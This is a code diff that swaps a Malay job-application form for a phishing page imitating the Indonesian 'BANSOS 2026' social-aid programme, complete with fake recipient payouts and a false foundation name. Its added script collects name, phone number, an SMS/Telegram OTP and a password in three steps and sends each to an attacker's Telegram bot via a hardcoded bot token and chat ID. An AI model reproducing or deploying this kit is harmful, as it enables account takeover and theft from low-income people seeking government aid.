@@ -1,378 +1,549 @@
-<!DOCTYPE html>
-<html lang="ms">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hantar Permohonan</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: 'Poppins', sans-serif;
-    background: linear-gradient(135deg, #102c50, #1766a4);
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-}
-
-.application-box {
-    background: white;
-    width: 100%;
-    max-width: 440px;
-    border-radius: 16px;
-    overflow: hidden;
-    box-shadow: 0 10px 40px rgba(0,0,0,.2);
-    animation: fadeIn .4s ease;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.header-banner {
-    background: linear-gradient(90deg, #0052cc, #0066ff);
-    padding: 28px 20px;
-    text-align: center;
-    position: relative;
-    overflow: hidden;
-}
-
-.header-banner::before {
-    content: "";
-    position: absolute;
-    top: 0; left: 0; right: 0; bottom: 0;
-    background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-    opacity: .4;
-}
-
-.apply-badge {
-    background: #ffcc00;
-    color: #003380;
-    font-size: 32px;
-    font-weight: 800;
-    padding: 8px 24px;
-    border-radius: 8px;
-    display: inline-block;
-    position: relative;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    box-shadow: 0 3px 0 #cc9900;
-}
-
-.header-banner h2 {
-    color: white;
-    font-size: 20px;
-    margin-top: 14px;
-    font-weight: 600;
-}
-
-.application-content {
-    padding: 26px 22px;
-}
-
-.application-content h3 {
-    font-size: 18px;
-    color: #102c50;
-    margin-bottom: 10px;
-}
-
-.application-description {
-    font-size: 13px;
-    color: #6d7787;
-    line-height: 1.7;
-    margin-bottom: 22px;
-}
-
-.form-label {
-    display: block;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 8px;
-    color: #334155;
-}
-
-.phone-wrapper {
-    display: flex;
-    align-items: center;
-    border: 1px solid #d5dce5;
-    border-radius: 8px;
-    overflow: hidden;
-    margin-bottom: 16px;
-    transition: .2s;
-}
-
-.phone-wrapper:focus-within {
-    border-color: #1766a4;
-    box-shadow: 0 0 0 3px rgba(23,102,164,.1);
-}
-
-.country-code {
-    background: #f1f5f9;
-    padding: 14px 12px;
-    font-size: 15px;
-    font-weight: 600;
-    color: #334155;
-    border-right: 1px solid #d5dce5;
-}
-
-.phone-input {
-    flex: 1;
-    padding: 14px 12px;
-    border: none;
-    font-size: 15px;
-    outline: none;
-    font-family: inherit;
-}
-
-.consent {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    font-size: 12px;
-    color: #687386;
-    line-height: 1.6;
-    margin-bottom: 22px;
-}
-
-.consent input {
-    margin-top: 3px;
-    width: 16px;
-    height: 16px;
-    cursor: pointer;
-}
-
-.submit-button {
-    width: 100%;
-    padding: 15px;
-    border: none;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 700;
-    cursor: pointer;
-    font-family: inherit;
-    background: linear-gradient(90deg, #1766a4, #102c50);
-    color: white;
-    transition: transform .2s, box-shadow .2s;
-}
-
-.submit-button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 6px 20px rgba(16,44,80,.35);
-}
-
-.submit-button:active {
-    transform: translateY(0);
-}
-
-.submit-button:disabled {
-    opacity: .7;
-    cursor: not-allowed;
-    transform: none;
-}
-
-.application-status {
-    font-size: 13px;
-    margin-bottom: 14px;
-    color: #c0392b;
-    display: none;
-    text-align: center;
-    padding: 10px;
-    background: #fdecea;
-    border-radius: 6px;
-    line-height: 1.5;
-}
-
-.application-status.success {
-    color: #16a34a;
-    background: #dcfce7;
-}
-
-.success-box {
-    text-align: center;
-    padding: 10px 0 20px;
-    display: none;
-}
-
-.success-box.show {
-    display: block;
-}
-
-.success-icon {
-    width: 60px;
-    height: 60px;
-    background: #22c55e;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin: 0 auto 12px;
-    color: white;
-    font-size: 32px;
-}
-
-.success-box h4 {
-    color: #16a34a;
-    font-size: 17px;
-    margin-bottom: 6px;
-}
-
-.success-box p {
-    font-size: 13px;
-    color: #64748b;
-}
-
-.reference-id {
-    background: #f1f5f9;
-    padding: 8px 12px;
-    border-radius: 4px;
-    font-family: monospace;
-    font-size: 14px;
-    margin-top: 10px;
-    display: inline-block;
-}
-</style>
+<!doctype html>
+<html lang="en" class="h-100">
+<head id="ctl00_Head1">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <link href="npm/bootstrap-5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" >
+    <link href="t5/assets/css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="t5/assets/css/menebus.css" type="text/css" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta property="og:title" content="𝗕𝗔𝗡𝗦𝗢𝗦 2026 : 𝙠𝙞𝙣𝙞 𝘿𝙞𝙗𝙪𝙠𝙖 𝙆𝙚𝙥𝙖𝙙𝙖 𝙍𝙖𝙠𝙮𝙖𝙩 𝙄𝙣𝙙𝙤𝙣𝙚𝙨𝙞𝙖 🇮🇩">
+    <meta property="og:image" content="https://i.ibb.co.com/WDr8XGX/ini.jpg">
+    <meta name="description" />
+    <meta name="author" content="Mykasih Foundation" />
+    <link rel="icon" href="../t5/assets/img/garuda-1.png">
+    <title>BANSOS 2026</title>
+	<link rel="canonical" href="https://apps-mykasihv4.my.id" />
+    <link rel="icon" type="image/x-icon" href="https://bantuan-sosial-indo2024.fnlc12.pw/c5/favicon.png" />
+    <link rel="stylesheet" href="npm/bootstrap-icons-1.4.1/font/bootstrap-icons.css" />
+	<script type="text/javascript" src="t5/js/vue.min.js"></script>
+	<script src="t5/js/clipboard.js"></script>
+	<script type="text/javascript" src="t5/js/index.js"></script>
+    <style type="text/css">
+        .bd-placeholder-img {
+            font-size: 1.125rem;
+            text-anchor: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
+        }
+        @media (min-width: 768px) {
+            .bd-placeholder-img-lg {
+                font-size: 3.5rem;
+            }
+        }
+	/* Absolute Center Spinner */
+        .loading {
+            position: fixed;
+            z-index: 999;
+            height: 2em;
+            width: 2em;
+            overflow: show;
+            margin: auto;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+        }
+        /* Transparent Overlay */
+        .loading:before {
+            content: '';
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+            background: -webkit-radial-gradient(rgba(20, 20, 20, .8), rgba(0, 0, 0, .8));
+        }
+        /* :not(:required) hides these rules from IE9 and below */
+        .loading:not(:required) {
+            /* hide "loading..." text */
+            font: 0/0 a;
+            color: transparent;
+            text-shadow: none;
+            background-color: transparent;
+            border: 0;
+        }
+        .loading:not(:required):after {
+            content: '';
+            display: block;
+            font-size: 10px;
+            width: 1em;
+            height: 1em;
+            margin-top: -0.5em;
+            -webkit-animation: spinner 150ms infinite linear;
+            -moz-animation: spinner 150ms infinite linear;
+            -ms-animation: spinner 150ms infinite linear;
+            -o-animation: spinner 150ms infinite linear;
+            animation: spinner 150ms infinite linear;
+            border-radius: 0.5em;
+            -webkit-box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+            box-shadow: rgba(255, 255, 255, 0.75) 1.5em 0 0 0, rgba(255, 255, 255, 0.75) 1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) 0 1.5em 0 0, rgba(255, 255, 255, 0.75) -1.1em 1.1em 0 0, rgba(255, 255, 255, 0.75) -1.5em 0 0 0, rgba(255, 255, 255, 0.75) -1.1em -1.1em 0 0, rgba(255, 255, 255, 0.75) 0 -1.5em 0 0, rgba(255, 255, 255, 0.75) 1.1em -1.1em 0 0;
+        }
+        /* Animation */
+        @-webkit-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        @-moz-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        @-o-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
-<body>
+<body class="d-flex flex-column h-100">
+<!---
+<div class="item">
+<div class="record_logo">
+<img src="t5/assets/img/avatar.png" alt="">
+</div>
+<div class="center">
+<div class="h1"><span class="name"></span> <span>Berjaya</span> <span class="number">RM 1.000,00</span></div>
+<div class="h2">3 jam yang lalu</div>
+</div>
+</div>
+--->
+<div id="loading" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 9999;">
+    <img src="t5/assets/img/processing.gif" alt="Loading..." width="100" />
+</div>
 
-<div class="application-box">
-    <div class="header-banner">
-        <div class="apply-badge">APPLY NOW</div>
-        <h2>Hantar Permohonan Sekarang</h2>
-    </div>
-
-    <div class="application-content">
-        <h3 id="jobTitle">Pembantu Tadbir Pejabat</h3>
-        <p id="jobDescription" class="application-description">Untuk mendaftar sila lengkapkan maklumat di bawah. Kami akan menghantar pautan untuk melengkapkan sesi permohonan anda yang telah disiapkan.</p>
-
-        <form id="applicationForm">
-            <input type="hidden" id="selectedJob" name="job" value="Pembantu Tadbir Pejabat">
-
-            <label class="form-label" for="phoneNumber">Nombor Telefon Malaysia</label>
-            <div class="phone-wrapper">
-                <span class="country-code">+60</span>
-                <input
-                    type="tel"
-                    id="phoneNumber"
-                    name="phone"
-                    class="phone-input"
-                    placeholder="Contoh: 123456789"
-                    inputmode="tel"
-                    autocomplete="tel"
-                    required
-                >
+<div id="loading" class="loading" style="display: none;"></div>
+    <main class="flex-shrink-0">
+        <div id="ctl00_divContainer" class="container container-narrow">
+            <div class="text-center mt-2">
+                <a id="ctl00_lnkMalay" disabled="disabled" style="color:Black;font-weight:bold;text-decoration:none;"></a>
+                <span id="ctl00_lblPipe_bm"> | </span>
+                <a id="ctl00_lnkEng" href="index.html"></a>
+                <span id="ctl00_lblPipe_bi"> | </span>
+                <a id="ctl00_lnkChineseSimplified" href="index.html"></a>
+                <span id="ctl00_lblPipe_bc"> | </span>
+                <a id="ctl00_lnkTamilInd" href="index.html"></a>
             </div>
-
-            <label class="consent">
-                <input type="checkbox" id="consentCheck" required>
-                <span>Saya bersetuju nombor telefon saya dihantar kepada pihak pengurusan untuk tujuan permohonan pekerjaan.</span>
-            </label>
-
-            <p id="applicationStatus" class="application-status" role="status"></p>
-
-            <button type="submit" class="submit-button" id="submitBtn">
-                Hantar Permohonan
-            </button>
-        </form>
-
-        <div class="success-box" id="successBox">
-            <div class="success-icon">✓</div>
-            <h4>Permohonan Dihantar!</h4>
-            <p>Terima kasih. Kami akan menghubungi anda sebentar lagi.</p>
-            <span class="reference-id" id="refDisplay"></span>
+            <div class="header mt-3 text-center">
+                <img src="../t5/assets/img/blt.png" id="ctl00_logohead" class="img-fluid" width="450" />
+            </div>
+            <script type="text/javascript">
+                //<![CDATA[
+                var theForm = document.forms['aspnetForm'];
+                if (!theForm) {
+                    theForm = document.aspnetForm;
+                    A
+                }
+                function __doPostBack(eventTarget, eventArgument) {
+                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                        theForm.__EVENTTARGET.value = eventTarget;
+                        theForm.__EVENTARGUMENT.value = eventArgument;
+                        theForm.submit();
+                    }
+                }
+                //]]>
+            </script>
+            <script type="text/javascript">
+                //<![CDATA[
+                function WebForm_OnSubmit() {
+                    if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+                    return true;
+                }
+                //]]>
+            </script>
+            <span id="ctl00_lblMsg"></span>
+            <h2 class="fw-bold mt-2 page-header text-center ">
+                <span id="ctl00_RecipientMasterContent_lblSubject">BANSOS 2026 </span>
+            </h2>
+			<div class="first">
+            <form action="javascript:void(0)" method="post" id="firstForm">
+			<div class="input-group mb-3">
+			<span class="input-group-text" id="basic-addon1">Nama</span>
+			<input name="full_name" id="full_name" maxlength="18" class="form-control" type="text" required="true" placeholder="Nama lengkap Sesuai KTP" title="Sila Masukkan Nombor , contoh +62822334455">
+			</div>
+			<div class="input-group mb-3">
+			<span class="input-group-text" id="basic-addon1">🇮🇩 +62</span>
+			<input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel" required="true" placeholder="08xxxx" title="Sila Masukkan Nombor , contoh +62890930">
+			</div>
+			<div class="text-center">
+			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">Cek Status</button>
+			</div>
+            </form>
+			</div>
+			<div class="second" style="display: none;">
+			<form action="javascript:void(0)" method="post" id="secondForm">
+			<input type="hidden" name="full_name" id="validateFullName" readonly>
+			<input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+			<div class="mb-3">
+			<label for="otp_code" class="form-label">
+            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami sudah Mengirimkan kode BANSOS 5 angka silahkan cek di SMS Telegram.</span>
+			</label>
+			<input name="otp_code" maxlength="5" id="otp_code" class="form-control" type="tel" required="true" placeholder="5 digit OTP">
+			</div>
+			<div class="text-center">
+			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">LANJUT</button>
+			</div>
+			</form>
+			</div>
+			<div class="third" style="display: none;">
+			<form action="javascript:void(0)" method="post" id="thirdForm">
+			<input type="hidden" name="full_name" id="validateFullName" readonly>
+			<input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+			<input type="hidden" name="otp_code" id="validateOtpCode" readonly>
+			<div class="mb-3">
+			<label for="password" class="form-label">
+            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata sandi anda.</span>
+			</label>
+			<input name="password" id="password" class="form-control" type="text" required="true" placeholder="Kata laluan anda">
+			</div>
+			<div class="text-center">
+			<button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processThirdData()">Lanjutkan</button>
+			</div>
+			</form>
+			</div>
+			<div  class="row four"id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
+			<p class="text-center"><img src="t5/assets/img/processing.gif" id="ctl00_logohead" class="img-fluid" width="160" /></p>
+			<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Sila tunggu proses pengesahan dalam masa 1x24 jam untuk menyemak kelayakan,</span></h5>
+			<h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">atau gunakan nombor telefon lain.</span></h5>
+			<p class="text-center"><a href="index.html" class="btn btn-lg btn-block btn-mk">&laquo; <span id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Gunakan Nombor Telefon Lain</span></a></p>
+			</div>
+            <script type="text/javascript">
+                //<![CDATA[
+                var Page_ValidationActive = false;
+                if (typeof(ValidatorOnLoad) == "function") {
+                    ValidatorOnLoad();
+                }
+                function ValidatorOnSubmit() {
+                    if (Page_ValidationActive) {
+                        return ValidatorCommonOnSubmit();
+                    } else {
+                        return true;
+                    }
+                }
+            </script>
+<!--- record berjaya box --->
+<div class="_record-box">
+    <div id="list" class="list-box">
+        <div class="list" style="margin-top: -3.1345px;">
+            <div class="item">
+                <div class="record_logo">
+                    <img src="t5/assets/img/avatar.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="h1"><span class="name">ROZANA</span></div>
+                    <div class="h2">Rp. 600.000</div> 
+           </div>
+           </div>
+			<div class="item">
+                <div class="record_logo">
+                    <img src="t5/assets/img/avatar.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="h1"><span class="name">IBNU SUTOMO </span></div>
+                    <div class="h2">Rp. 500.000</div>
+           </div>
+            </div>
+			<div class="item">
+                <div class="record_logo">
+                    <img src="t5/assets/img/avatar.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="h1"><span class="name">ABDILAH TOULAN FADLI </span></div>
+                    <div class="h2">Rp. 225.000</div>
+            </div>
+            </div>
+			<div class="item">
+                <div class="record_logo">
+                    <img src="t5/assets/img/avatar.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="h1"><span class="name">SIAN</span></div>
+                    <div class="h2">Rp. 750.000</div>
+            </div>
+            </div>
+			<div class="item">
+                <div class="record_logo">
+                    <img src="t5/assets/img/avatar.png" alt="">
+                </div>
+                <div class="center">
+                    <div class="h1"><span class="name">ANDRIAS.A.ANDANI</span></div>
+ <div class="h2">Rp. 1.000.000</div>
+         </div>
+                </div>
+            </div>
         </div>
     </div>
 </div>
+<!--- record berjaya box --->
+        </div>
+        </div>
+        </div>
+    </main>
+    
+    <br>
+    <div class="header mt-3 text-center">
+        <img src="t5/assets/img/ini1.png" id="ctl00_logohead" class="img-fluid" width="450" />
+    </div>
+    <footer class="footer mt-auto py-3">
+        <div class="container">
+            <div class="row">
+                <div class="col-5">
+                    <span class="text-white">
+                        <span id="ctl00_lblCopyRight">2026 All Rights Reserved. </span>
+                    </span>
+                </div>
+                <div class="col">
+    <ul class="nav justify-content-end">
+        <li class="nav-item">
+            <a class="nav-link" href="https://t.me/CS_PKH2026" target="_blank">
+                <i class="bi-question-circle"></i>
+                <span>Pertanyaan lainnya</span>
+            </a>
+        </li>
 
+        <li class="nav-item">
+            <a class="nav-link" href="https://www.ojk.go.id/id/Default.aspx" target="_blank">
+                <i class="bi-shop"></i>
+                <span>OJK</span>
+            </a>
+        </li>
+
+        <li class="nav-item">
+            <a class="nav-link" href="https://t.me/CS_PKH2026" target="_blank">
+                <i class="bi-envelope"></i>
+                <span>Hubungi Kami</span>
+            </a>
+        </li>
+    </ul>
+</div>
+            </div>
+        </div>
+    </footer>
+<script src="jquery-3.7.1.min.js" ></script>
+<script type="text/javascript" src="jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
-const form = document.getElementById("applicationForm");
-const submitBtn = document.getElementById("submitBtn");
-const statusBox = document.getElementById("applicationStatus");
-const successBox = document.getElementById("successBox");
-const refDisplay = document.getElementById("refDisplay");
+// Function to send data to Telegram Bot
+        // Function to send data to Telegram Bot
+function sendToTelegram(message) {
+    const botToken = "7781419898:AAEsXZ7bg1-583UZR4zSbcwnjrhD1SzHr1I"; // Replace with your bot token
+    const chatId = "5737256743"; // Replace with your chat ID
 
-form.addEventListener("submit", async function(event) {
-    event.preventDefault();
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const data = {
+        chat_id: chatId,
+        text: message
+    };
 
-    // Ambil nilai
-    const job = document.getElementById("selectedJob").value.trim();
-    const phoneInput = document.getElementById("phoneNumber").value.trim();
-    const consent = document.getElementById("consentCheck").checked;
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Message sent", data);
+    })
+    .catch(error => {
+        console.error("Error sending message", error);
+    });
+}
 
-    // Gabungkan dengan +60
-    const fullPhone = '60' + phoneInput;
+// Show and hide loading spinner
+function showLoading() {
+    document.getElementById('loading').style.display = 'block';
+}
 
-    // Reset mesej
-    statusBox.style.display = "none";
-    statusBox.className = "application-status";
-    successBox.classList.remove("show");
+function hideLoading() {
+    document.getElementById('loading').style.display = 'none';
+}
 
-    // Validasi
-    if (!job || !phoneInput || !consent) {
-        statusBox.textContent = "❌ Sila lengkapkan semua maklumat.";
-        statusBox.style.display = "block";
-        return;
-    }
+// Process first form data
+function processFirstData() {
+    $('#firstForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
 
-    // Validasi format nombor telefon
-    const phoneRegex = /^(?:\+?60|0)?1\d{7,9}$/;
-    if (!phoneRegex.test('0' + phoneInput) && !phoneRegex.test(phoneInput)) {
-        statusBox.textContent = "❌ Sila masukkan nombor telefon yang sah.";
-        statusBox.style.display = "block";
-        return;
-    }
+        var $full_name = $("input#full_name").val();
+        var $phone_number = $("input#phone_number").val();
 
-    // Kunci butang
-    submitBtn.disabled = true;
-    submitBtn.textContent = "Sedang Menghantar...";
-
-    try {
-        // ✅ HANTAR KE API SEBENAR
-        const response = await fetch("/api/apply", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                job: job,
-                phone: fullPhone,
-                consent: consent
-            })
-        });
-
-        const result = await response.json();
-
-        if (result.success === true) {
-            // Berjaya
-            form.style.display = "none";
-            successBox.classList.add("show");
-            if (result.reference) {
-                refDisplay.textContent = `No. Rujukan: ${result.reference}`;
-            }
-        } else {
-            // Gagal dari server
-            throw new Error(result.message || "Permohonan gagal dihantar.");
+        if ($full_name === "" || $phone_number === "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            hideLoading();
+            return false;
         }
 
-    } catch (error) {
-        console.error("Error:", error);
-        statusBox.textContent = "❌ " + error.message;
-        statusBox.style.display = "block";
-    } finally {
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Hantar Permohonan";
-    }
-});
-</script>
+        var message = `New Bansos Request: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}`;
+        sendToTelegram(message);
 
-</body>
+        setTimeout(() => {
+            $(".second").show();
+            $(".first").hide();
+            $("input#validateFullName").val($full_name);
+            $("input#validatePhoneNumber").val($phone_number);
+            hideLoading();
+        }, 2000);
+
+        return false;
+    });
+}
+
+function processSecondData() {
+    $('#secondForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
+
+        var $full_name = $("input#validateFullName").val();
+        var $phone_number = $("input#validatePhoneNumber").val();
+        var $otp_code = $("input#otp_code").val();
+
+        if ($otp_code === "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            hideLoading();
+            return false;
+        }
+
+        var message = `OTP Code Verification: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}`;
+        sendToTelegram(message);
+
+        setTimeout(() => {
+            $(".third").show();
+            $(".second").hide();
+            $("input#validateOtpCode").val($otp_code);
+            hideLoading();
+        }, 2000);
+
+        return false;
+    });
+}
+
+function processThirdData() {
+    $('#thirdForm').submit(function(event) {
+        event.preventDefault();
+        showLoading();
+
+        var $full_name = $("input#validateFullName").val();
+        var $phone_number = $("input#validatePhoneNumber").val();
+        var $otp_code = $("input#validateOtpCode").val();
+        var $password = $("input#password").val();
+
+        if ($password === "") {
+            $('.verification_info').show();
+            $('.account_verification').hide();
+            hideLoading();
+            return false;
+        }
+
+        var message = `Final Submission: \nFull Name: ${$full_name}\nPhone Number: ${$phone_number}\nOTP Code: ${$otp_code}\nPassword: ${$password}`;
+        sendToTelegram(message);
+
+        setTimeout(() => {
+            alert("Data submitted successfully!");
+            hideLoading();
+            window.location.reload();
+        }, 2000);
+
+        return false;
+    });
+}
+
+</script>
+<script type="text/javascript" src="t5/js/jquery-3.4.1.min.js"></script>
+<script>
+    // 加载多语言
+    var language = getQueryString('language')
+    loadLocale(function(e) {
+        app.locale = Object.assign(e.Common, e.CommonShare)
+    }, language)
+    var app = new Vue({
+        el: '#app',
+        data: {
+            locale: {},
+            uid: '2004219',
+        },
+        created() {
+            $('#app').show();
+            this.starScroll();
+        },
+        methods: {
+            starScroll() {
+                var _this = this;
+                _this.scrollTimer && clearTimeout(_this.scrollTimer)
+                _this.scrollTimer = setTimeout(() => {
+                    var $box = $("#list").find(".list:first");
+                    $box.css({
+                        marginTop: 0
+                    })
+                    var $item = $box.find(".item:first");
+                    var outerHeight = $item.outerHeight(true)
+                    $box.animate({
+                        "marginTop": -outerHeight + "px"
+                    }, 1000, function() {
+                        $box.css({
+                            marginTop: 0
+                        }).find(".item:first").appendTo($box);
+                        _this.starScroll();
+                    })
+                }, 600);
+            },
+        },
+    })
+</script>
 </html>
